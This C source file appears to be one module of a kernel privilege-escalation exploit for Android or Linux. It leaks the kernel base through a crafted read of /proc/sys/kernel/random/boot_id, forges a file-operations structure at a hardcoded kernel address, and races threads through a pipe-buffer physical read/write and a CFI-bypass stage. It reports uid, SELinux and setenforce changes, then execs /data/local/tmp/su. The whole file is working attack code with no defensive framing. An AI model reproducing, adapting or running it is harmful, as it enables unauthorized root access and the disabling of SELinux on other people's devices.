#include "common.h"

atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int fake_fops_request;
atomic_int fake_fops_done;
int memfd_leak;

void reset_main_route_state(void) {
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  atomic_store(&cfi_stage_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

#define EXP_BUF_NWORDS 16

enum {
  EXP_W_TREE_PC      = 0,
  EXP_W_TREE_RIGHT   = 1,
  EXP_W_TREE_LEFT    = 2,
  EXP_W_PI_TREE_PC   = 3,
  EXP_W_PI_TREE_RIGHT = 4,
  EXP_W_PI_TREE_LEFT  = 5,
  EXP_W_TASK         = 6,
  EXP_W_LOCK         = 7,
  EXP_W_PI_PRIO      = 8,
  EXP_W_PI_DEADLINE  = 9,
};

static void build_exp_buffer_fops(uint64_t *buf) {
  if (!buf) return;
  memset(buf, 0, EXP_BUF_NWORDS * sizeof(uint64_t));

 uint64_t target = 0xffffff802819688ULL;   

  pr_info("FAKE FOPS: fake_fops=0x%llx, target=0x%llx, lock=0x%llx\n",
          (unsigned long long)fake_fops,
          (unsigned long long)target,
          (unsigned long long)fake_lock);

  buf[EXP_W_TREE_PC]       = fake_fops;
  buf[EXP_W_TREE_RIGHT]    = target;   /* Hardcoded direct‑map alias */
  buf[EXP_W_TREE_LEFT]     = 0;

  buf[EXP_W_PI_TREE_PC]    = 0;
  buf[EXP_W_PI_TREE_RIGHT] = 0;
  buf[EXP_W_PI_TREE_LEFT]  = 0;

  buf[EXP_W_TASK]          = text_addr(INIT_TASK);
  buf[EXP_W_LOCK]          = fake_lock;
  buf[EXP_W_PI_PRIO]       = 0;
  buf[EXP_W_PI_DEADLINE]   = 0;
}

// doreplacefops() returns 1 on success, 0 on failure
int doreplacefops(void) {
  uint64_t exp_buffer[128];
  build_exp_buffer_fops(exp_buffer);
  int ret = exp_stack_once(exp_buffer);
  if (ret != 0) {
    pr_warning("fops exp_stack_once failed ret=%d errno=%d\n", ret, errno);
    return 0;
  }
  return 1;
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;
  pr_debug("slide_read_stext buf->%s\n", buf);
  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) continue;
    if (nibble < 0) { nibble = v; continue; }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}

#define CFI_ROUTE_ATTEMPTS 24

static void *cfi_thread(void *arg __attribute__((unused))) {
  int attempts = 0;
  while (!atomic_load(&cfi_stage_done) && attempts < CFI_ROUTE_ATTEMPTS) {
    atomic_store(&fake_fops_request, 1);
    atomic_store(&fake_fops_done, 0);
    time_t wait_start = time(NULL);
    while (!atomic_load(&fake_fops_done) &&
           time(NULL) - wait_start < CFI_FOPS_WAIT_SEC) {
      usleep(1000);
    }
    if (!atomic_load(&fake_fops_done)) {
      pr_warning("timed out waiting for fake-fops replacement\n");
      break;
    }
    pr_info("enter CFI stage\n");
    try_cfi_stage();
    attempts++;
  }
  if (!atomic_load(&cfi_stage_done)) {
    pr_warning("CFI stage failed after %d attempts\n", attempts);
  }
  return NULL;
}

void run_main_route_threads(void) {
  pthread_t cfi;
  int page_ready = 0;
  int attempts = 0;
  time_t route_start = time(NULL);
  pthread_create(&cfi, NULL, cfi_thread, NULL);
  while (!atomic_load(&cfi_stage_done) && attempts < CFI_ROUTE_ATTEMPTS &&
         time(NULL) - route_start < ROUTE_TIMEOUT_SEC) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pr_info("prepare_pipe_buffer_page\n");
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    if (atomic_exchange(&fake_fops_request, 0)) {
      if (!page_ready) {
        pr_info("prepare fake-fops kernel page (once)\n");
        page_base = prepare_good_kernel_page();
        if (!page_base) {
          pr_warning("fake-fops kernel page prepare failed\n");
          break;
        }
        page_ready = 1;
      }
      reset_main_route_state();
      pr_info("replace_fake_fops this may cause deadlock\n");
      doreplacefops();
      atomic_store(&fake_fops_done, 1);
      attempts++;
    }
    usleep(10000);
  }
  if (!atomic_load(&cfi_stage_done)) {
    pr_warning("route thread loop exited without CFI success "
               "(attempts=%d elapsed=%lds)\n", attempts,
               (long)(time(NULL) - route_start));
  }
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  ksym_config_init();
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }

  pin_to_core(CORE);
  run_main_route_threads();

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, (unsigned long long)kaslr_base, (unsigned long long)kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  pid_t p = fork();
  if (p < 0) {
    pr_info("fork failed: errno=%d (%s)\n", errno, strerror(errno));
    return 1;
  }
  if (p > 0) {
    return 0;
  } else {
    execl("/data/local/tmp/su", "su", NULL);
  }
  return 0;
}
